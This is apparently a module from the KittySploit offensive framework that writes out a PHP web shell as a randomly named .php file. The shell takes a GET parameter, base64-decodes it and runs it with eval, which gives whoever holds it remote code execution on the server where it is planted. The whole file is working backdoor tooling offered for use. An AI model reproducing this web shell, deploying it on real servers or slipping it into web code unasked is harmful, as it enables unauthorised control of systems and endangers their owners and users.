from kittysploit import *

class Module(Backdoor):
	
	__info__ = {
		'name': 'Shell Php GET',
		'description': 'Shell Php GET',
		'author': 'KittySploit Team',
		'listener': 'listeners/web/php_get',
		'session_type': SessionType.PHP,
		'arch': Arch.PHP,
	}

	param_name = OptString("kitty_shell", "param name for connect", True)

	def run(self):
		
		filename = self.random_text(8)+".php"
		data = f"""<?php
$data = $_GET['{self.param_name}'];
echo eval(base64_decode($data));
?>
"""

		self.write_out_dir(filename, data)
		print_success(f"Filename : {filename}")
